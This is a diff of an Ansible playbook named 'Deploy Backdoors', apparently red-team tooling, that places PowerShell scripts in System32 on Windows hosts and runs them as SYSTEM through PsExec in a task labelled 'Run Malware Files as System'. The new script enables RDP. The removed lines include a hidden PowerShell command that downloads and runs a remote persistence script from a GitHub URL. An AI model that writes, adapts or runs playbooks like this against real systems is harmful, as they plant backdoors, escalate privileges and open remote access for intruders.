@@ -1,10 +1,10 @@
-#-
-#  name: Deploy Backdoors
-#  hosts: windows
-#  strategy: free
-#  gather_facts: no
-#  tasks:
-#    - include: tasks/upload_psexec.yaml
+-
+  name: Deploy Backdoors
+  hosts: windows
+  strategy: free
+  gather_facts: no
+  tasks:
+    - include: tasks/upload_psexec.yaml
 
 
 
@@ -21,8 +21,7 @@
         src: 'files/{{item}}'
         dest: 'C:\Windows\System32\{{item}}'
       with_items:
-        - "cald.ps1"
-        - "cool.ps1"
+        - "enable-rdp.ps1"
 
 
     - name:  Run Malware Files as System
@@ -33,9 +32,4 @@
         system: yes
         interactive: yes
       with_items:
-        - "powershell.exe C:\\Windows\\System32\\cald.ps1"
-        - "powershell.exe C:\\Windows\\System32\\cool.ps1"
-
-
-#    - name: Run powershell as a specific domain user
-#      win_command: powershell.exe -Sta -Nop -w hidden -Command "IEX(IWR https://raw.githubusercontent.com/NotoriousRebel/deployPersist/master/persist.ps1?token=AIVA5CZTFRGLBKBBZUWQDMC5TAIA6' -UseBasicParsing)"
+        - "powershell.exe C:\\Windows\\System32\\enable-rdp.ps1"
